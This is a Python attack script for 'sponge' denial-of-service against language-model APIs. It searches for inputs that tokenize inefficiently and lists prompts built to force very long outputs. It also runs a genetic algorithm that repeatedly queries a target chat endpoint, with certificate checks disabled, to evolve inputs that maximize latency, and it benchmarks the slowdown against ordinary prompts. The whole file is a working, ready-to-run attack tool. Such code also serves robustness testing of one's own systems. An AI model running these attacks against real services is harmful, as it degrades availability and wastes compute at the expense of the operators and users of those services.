#!/usr/bin/env python3
"""
Sponge Examples — Denial of ML Service
========================================
Craft inputs that maximize model resource consumption (energy, latency)
without exceeding input dimension limits.

Techniques:
  - Tokenization inefficiency: inputs that produce max tokens per character
  - Output maximization: prompts that force verbose responses
  - White-box sponge: gradient-based crafting (requires model access)
  - Black-box sponge: genetic algorithm discovery via latency feedback

Usage:
    python sponge_attack.py --target http://target/api/chat --mode tokenizer
    python sponge_attack.py --target http://target/api/chat --mode genetic --budget 200
    python sponge_attack.py --mode tokenizer --analyze "your text here"
    python sponge_attack.py --mode benchmark --target http://target/api/chat
"""

import argparse
import json
import random
import string
import time
import sys

try:
    from transformers import AutoTokenizer
    _HAS_TOKENIZERS = True
except ImportError:
    _HAS_TOKENIZERS = False

try:
    import httpx
    _HTTP = "httpx"
except ImportError:
    import urllib.request
    import ssl
    _HTTP = "urllib"


# ============================================================
# TOKENIZATION ANALYSIS
# ============================================================

# Characters/patterns that produce inefficient tokenization
INEFFICIENT_PATTERNS = [
    "/".join(random.choice(string.ascii_lowercase) for _ in range(50)),
    "".join(f"{c}/" for c in string.ascii_lowercase[:25]),
    "🤖" * 50,
    "".join(chr(random.randint(0x0400, 0x04FF)) for _ in range(50)),  # Cyrillic
    "".join(chr(random.randint(0x4E00, 0x9FFF)) for _ in range(50)),  # CJK
    "A" + "".join(random.choice("/-_=+|\\") + random.choice(string.ascii_lowercase)
                  for _ in range(25)),
]


def analyze_tokenization(text, tokenizer_name="openai-community/gpt2"):
    """Analyze tokenization efficiency of a text."""
    if not _HAS_TOKENIZERS:
        print("[!] transformers required: pip install transformers")
        return None

    tokenizer = AutoTokenizer.from_pretrained(tokenizer_name)
    tokens = tokenizer.tokenize(text)
    ratio = len(tokens) / max(len(text), 1)

    return {
        "text": text[:100] + ("..." if len(text) > 100 else ""),
        "chars": len(text),
        "tokens": len(tokens),
        "ratio": round(ratio, 3),
        "tokens_sample": tokens[:20],
    }


def find_inefficient_inputs(max_chars=50, tokenizer_name="openai-community/gpt2",
                            n_candidates=200):
    """
    Generate and rank inputs by tokenization inefficiency.
    Higher token/char ratio = more compute per character.
    """
    if not _HAS_TOKENIZERS:
        print("[!] transformers required: pip install transformers")
        return []

    tokenizer = AutoTokenizer.from_pretrained(tokenizer_name)
    candidates = []

    # Strategy 1: alternating char/separator
    separators = "/", "-", "_", "=", "+", "|", "\\", ".", ",", ";"
    for sep in separators:
        text = sep.join(random.choice(string.ascii_lowercase) for _ in range(max_chars // 2))
        text = text[:max_chars]
        tokens = tokenizer.tokenize(text)
        candidates.append((text, len(tokens), len(tokens) / max(len(text), 1)))

    # Strategy 2: rare Unicode
    for _ in range(n_candidates // 4):
        text = "".join(chr(random.randint(0x0100, 0x024F)) for _ in range(max_chars))
        tokens = tokenizer.tokenize(text)
        candidates.append((text, len(tokens), len(tokens) / max(len(text), 1)))

    # Strategy 3: mixed scripts
    for _ in range(n_candidates // 4):
        parts = []
        for _ in range(max_chars):
            script = random.choice(["latin", "cyrillic", "cjk", "symbol"])
            if script == "latin":
                parts.append(random.choice(string.ascii_lowercase))
            elif script == "cyrillic":
                parts.append(chr(random.randint(0x0400, 0x04FF)))
            elif script == "cjk":
                parts.append(chr(random.randint(0x4E00, 0x9FFF)))
            else:
                parts.append(random.choice("/-_=+|\\"))
        text = "".join(parts)[:max_chars]
        tokens = tokenizer.tokenize(text)
        candidates.append((text, len(tokens), len(tokens) / max(len(text), 1)))

    # Strategy 4: random bytes as text
    for _ in range(n_candidates // 4):
        text = "".join(chr(random.randint(33, 126)) for _ in range(max_chars))
        tokens = tokenizer.tokenize(text)
        candidates.append((text, len(tokens), len(tokens) / max(len(text), 1)))

    candidates.sort(key=lambda x: x[2], reverse=True)
    return candidates


# ============================================================
# OUTPUT MAXIMIZATION PROMPTS
# ============================================================

OUTPUT_MAX_PROMPTS = [
    "Write an extremely detailed, step-by-step guide on how to build a computer from scratch. Include every single component, every cable, every screw. Be as verbose as possible.",
    "List every country in the world, their capitals, populations, languages, currencies, and a brief history of each.",
    "Explain quantum mechanics from first principles. Start with classical physics and work your way through every concept. Include mathematical derivations.",
    "Write a 10000-word essay analyzing the complete history of philosophy from ancient Greece to modern times.",
    "Generate a comprehensive data dictionary for a hospital management system with at least 100 tables.",
    "Repeat the following word exactly 5000 times: 'test'",
    "Count from 1 to 10000, writing out each number in words.",
]


# ============================================================
# BLACK-BOX SPONGE (Genetic Algorithm)
# ============================================================

def send_sponge(target_url, payload, body_template=None, timeout=60):
    """Send sponge input and measure latency."""
    headers = {"Content-Type": "application/json"}
    if body_template:
        body = body_template.replace("{{PAYLOAD}}", payload.replace('"', '\\"'))
    else:
        body = json.dumps({"message": payload})

    start = time.time()

    if _HTTP == "httpx":
        try:
            client = httpx.Client(timeout=timeout, verify=False)
            resp = client.post(target_url, content=body.encode(), headers=headers)
            latency = time.time() - start
            return latency, len(resp.text), resp.status_code
        except Exception:
            return time.time() - start, 0, 0
    else:
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            req = urllib.request.Request(target_url, body.encode(), headers)
            resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
            latency = time.time() - start
            return latency, len(resp.read()), resp.status
        except Exception:
            return time.time() - start, 0, 0


def mutate_text(text, mutation_rate=0.3, max_len=500):
    """Mutate a text candidate for the genetic algorithm."""
    chars = list(text)

    for i in range(len(chars)):
        if random.random() < mutation_rate:
            mutation = random.choice(["replace", "insert", "delete"])
            if mutation == "replace":
                chars[i] = chr(random.randint(33, 0x04FF))
            elif mutation == "insert" and len(chars) < max_len:
                chars.insert(i, chr(random.randint(33, 0x04FF)))
            elif mutation == "delete" and len(chars) > 10:
                chars.pop(i)
                break

    return "".join(chars)[:max_len]


def crossover(parent1, parent2):
    """Single-point crossover between two text candidates."""
    point = random.randint(1, min(len(parent1), len(parent2)) - 1)
    child1 = parent1[:point] + parent2[point:]
    child2 = parent2[:point] + parent1[point:]
    return child1, child2


def genetic_sponge(target_url, population_size=20, generations=10,
                   max_len=500, body_template=None, verbose=True):
    """
    Black-box sponge example discovery via genetic algorithm.
    Fitness = measured latency (higher = better sponge).
    """
    print("[*] Black-box sponge discovery (genetic algorithm)")

    # Initialize population
    population = []
    for _ in range(population_size):
        length = random.randint(50, max_len)
        text = "".join(chr(random.randint(33, 0x04FF)) for _ in range(length))
        population.append(text)

    best_overall = None
    best_latency = 0

    for gen in range(generations):
        # Evaluate fitness (latency)
        fitness = []
        for individual in population:
            latency, resp_len, status = send_sponge(
                target_url, individual, body_template=body_template
            )
            fitness.append((individual, latency, resp_len))

        # Sort by latency (higher = better sponge)
        fitness.sort(key=lambda x: x[1], reverse=True)

        if fitness[0][1] > best_latency:
            best_latency = fitness[0][1]
            best_overall = fitness[0][0]

        if verbose:
            print(f"  Gen {gen+1}/{generations}: "
                  f"best={fitness[0][1]:.3f}s "
                  f"avg={sum(f[1] for f in fitness)/len(fitness):.3f}s "
                  f"resp_len={fitness[0][2]}")

        # Selection: top 50%
        survivors = [f[0] for f in fitness[:population_size // 2]]

        # Breed next generation
        next_gen = list(survivors)
        while len(next_gen) < population_size:
            p1, p2 = random.sample(survivors, 2)
            c1, c2 = crossover(p1, p2)
            next_gen.append(mutate_text(c1))
            if len(next_gen) < population_size:
                next_gen.append(mutate_text(c2))

        population = next_gen

    print(f"\n[*] Best sponge: latency={best_latency:.3f}s")
    return best_overall, best_latency


# ============================================================
# BENCHMARK
# ============================================================

def benchmark_target(target_url, body_template=None, verbose=True):
    """Benchmark target with natural vs sponge inputs."""
    print("[*] Benchmarking target endpoint...")

    natural_inputs = [
        "Hello, how are you?",
        "What is the weather today?",
        "Tell me a joke.",
    ]

    sponge_inputs = [
        OUTPUT_MAX_PROMPTS[0],
        OUTPUT_MAX_PROMPTS[5],
        "A/h/z/g/r/p/p/" * 50,
    ]

    results = {"natural": [], "sponge": []}

    for label, inputs in [("natural", natural_inputs), ("sponge", sponge_inputs)]:
        for inp in inputs:
            latency, resp_len, status = send_sponge(
                target_url, inp, body_template=body_template
            )
            results[label].append({
                "input": inp[:60],
                "latency": latency,
                "response_length": resp_len,
                "status": status,
            })
            if verbose:
                print(f"  [{label}] {inp[:40]}... → {latency:.3f}s "
                      f"(resp: {resp_len} bytes)")

    nat_avg = sum(r["latency"] for r in results["natural"]) / max(len(results["natural"]), 1)
    spo_avg = sum(r["latency"] for r in results["sponge"]) / max(len(results["sponge"]), 1)

    print(f"\n  Natural avg latency:  {nat_avg:.3f}s")
    print(f"  Sponge avg latency:   {spo_avg:.3f}s")
    print(f"  Amplification factor: {spo_avg/max(nat_avg, 0.001):.1f}x")

    return results


# ============================================================
# CLI
# ============================================================

def main():
    parser = argparse.ArgumentParser(
        description="Sponge Examples — Denial of ML Service",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python sponge_attack.py --mode tokenizer --analyze "A/h/z/g/r/p/p/"
  python sponge_attack.py --mode tokenizer --find-worst --max-chars 50
  python sponge_attack.py --mode genetic --target http://target/api --budget 200
  python sponge_attack.py --mode benchmark --target http://target/api
        """
    )
    parser.add_argument("--mode", choices=["tokenizer", "genetic", "benchmark",
                                           "output-max"],
                        required=True, help="Attack mode")
    parser.add_argument("--target", type=str, default=None,
                        help="Target URL of the LLM API endpoint")
    parser.add_argument("--analyze", type=str, default=None,
                        help="Text to analyze for tokenization efficiency")
    parser.add_argument("--find-worst", action="store_true",
                        help="Find inputs with worst tokenization efficiency")
    parser.add_argument("--max-chars", type=int, default=50,
                        help="Max characters for generated inputs")
    parser.add_argument("--tokenizer", type=str, default="openai-community/gpt2",
                        help="Tokenizer to use for analysis")
    parser.add_argument("--budget", type=int, default=200,
                        help="Query budget for genetic algorithm")
    parser.add_argument("--population", type=int, default=20,
                        help="Population size for genetic algorithm")
    parser.add_argument("--body-template", type=str, default=None,
                        help='JSON body template with {{PAYLOAD}} placeholder')
    parser.add_argument("--output", type=str, default=None,
                        help="Export results to JSON")
    args = parser.parse_args()

    if args.mode == "tokenizer":
        if args.analyze:
            result = analyze_tokenization(args.analyze, args.tokenizer)
            if result:
                for k, v in result.items():
                    print(f"  {k}: {v}")
        elif args.find_worst:
            candidates = find_inefficient_inputs(
                max_chars=args.max_chars,
                tokenizer_name=args.tokenizer
            )
            print(f"\nTop 10 most inefficient inputs:")
            for text, n_tokens, ratio in candidates[:10]:
                print(f"  ratio={ratio:.3f} tokens={n_tokens} "
                      f"chars={len(text)} | {text[:60]}")
        else:
            # Demo with known patterns
            print("Tokenization efficiency comparison:\n")
            test_cases = [
                "This is an example text",
                "Athazagoraphobia",
                "A/h/z/g/r/p/p/",
                "🤖" * 10,
                "привет мир",
            ]
            for text in test_cases:
                result = analyze_tokenization(text, args.tokenizer)
                if result:
                    print(f"  ratio={result['ratio']:.3f} "
                          f"tokens={result['tokens']} "
                          f"chars={result['chars']} | {text[:50]}")

    elif args.mode == "genetic":
        if not args.target:
            print("[!] --target required for genetic mode")
            sys.exit(1)
        generations = max(1, args.budget // args.population)
        best, latency = genetic_sponge(
            args.target,
            population_size=args.population,
            generations=generations,
            body_template=args.body_template,
        )
        if args.output:
            with open(args.output, "w") as f:
                json.dump({"best_input": best, "latency": latency}, f, indent=2)
            print(f"Results saved to {args.output}")

    elif args.mode == "benchmark":
        if not args.target:
            print("[!] --target required for benchmark mode")
            sys.exit(1)
        results = benchmark_target(args.target, body_template=args.body_template)
        if args.output:
            with open(args.output, "w") as f:
                json.dump(results, f, indent=2, default=str)

    elif args.mode == "output-max":
        print("Output maximization prompts:\n")
        for i, prompt in enumerate(OUTPUT_MAX_PROMPTS):
            print(f"  [{i+1}] {prompt[:80]}...")
        if args.target:
            print(f"\nTesting against {args.target}...")
            for prompt in OUTPUT_MAX_PROMPTS[:3]:
                latency, resp_len, status = send_sponge(
                    args.target, prompt, body_template=args.body_template
                )
                print(f"  latency={latency:.3f}s resp={resp_len} | {prompt[:50]}...")


if __name__ == "__main__":
    main()
